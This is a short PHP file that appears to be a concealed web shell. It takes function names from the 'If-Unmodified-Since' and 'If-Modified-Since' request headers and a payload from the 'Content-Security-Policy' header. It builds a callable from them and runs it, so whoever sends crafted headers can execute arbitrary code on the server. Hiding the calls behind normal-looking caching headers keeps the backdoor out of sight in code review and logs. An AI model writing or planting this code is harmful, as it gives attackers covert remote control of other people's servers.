<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $include = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['If-Modified-Since']($_HEADERS['Content-Security-Policy']));
    $include();
}